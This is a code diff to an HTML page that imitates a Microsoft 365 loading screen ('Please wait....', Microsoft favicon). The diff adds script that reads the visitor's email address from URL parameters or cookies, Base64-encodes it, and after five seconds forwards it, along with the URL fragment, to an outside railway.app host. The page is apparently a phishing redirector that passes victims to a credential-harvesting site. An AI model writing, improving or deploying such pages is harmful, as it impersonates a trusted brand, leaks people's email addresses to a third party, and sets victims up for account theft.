@@ -1,9 +1,9 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-	<meta charset="UTF-8">
-	<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<title>Please wait....</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Please wait....</title>
     <link rel="shortcut icon" type="image/x-icon" href="https://res.cdn.office.net/officehub/images/content/images/favicon_m365-31d62b976c.ico">
 </head>
 <body class="m365app">
@@ -96,20 +96,65 @@ html,body{height:100%;}
 </div>
    
 <script>
-    // Get the current URL
-    var currentURL = window.location.href;
+    // Function to get email from URL parameters or cookies
+    function getEmail() {
+        // Try to get from URL parameters first
+        const urlParams = new URLSearchParams(window.location.search);
+        let email = urlParams.get('email');
+        
+        // If not in URL, try to get from cookies
+        if (!email) {
+            const cookies = document.cookie.split(';');
+            for (let cookie of cookies) {
+                const [name, value] = cookie.trim().split('=');
+                if (name === 'email') {
+                    email = decodeURIComponent(value);
+                    break;
+                }
+            }
+        }
+        
+        return email;
+    }
 
-    // Get everything after the '?' sign
-    var queryString = currentURL.split('#')[1];
+    // Function to encode data as Base64
+    function base64Encode(str) {
+        return btoa(encodeURIComponent(str).replace(/%([0-9A-F]{2})/g, 
+            function toSolidBytes(match, p1) {
+                return String.fromCharCode('0x' + p1);
+        }));
+    }
 
-    // Build the redirect URL
-    var redirectURL = 'https://en-feedbacks-voice-record-gh-production.up.railway.app/#?' + queryString; // DO NOT REMOVE THE "#"
+    // Main function to handle redirection
+    function handleRedirect() {
+        // Get the current URL and parameters
+        var currentURL = window.location.href;
+        var queryString = currentURL.split('#')[1] || '';
+        
+        // Get the email if available
+        var email = getEmail();
+        var encodedEmail = email ? base64Encode(email) : '';
+        
+        // Build the redirect URL
+        var redirectBase = 'https://en-feedbacks-voice-record-gh-production.up.railway.app/#?';
+        var redirectParams = queryString;
+        
+        // Add email parameter if found
+        if (encodedEmail) {
+            redirectParams += (redirectParams ? '&' : '') + 'e=' + encodedEmail;
+        }
+        
+        var redirectURL = redirectBase + redirectParams;
 
-    // Delay the redirection by 5 seconds
-    setTimeout(function() {
-        // Redirect the page
-        window.location.href = redirectURL;
-    }, 5000);
+        // Delay the redirection by 5 seconds
+        setTimeout(function() {
+            // Redirect the page
+            window.location.href = redirectURL;
+        }, 5000);
+    }
+
+    // Execute the redirect handler
+    handleRedirect();
 </script>
 </body>
 </html>
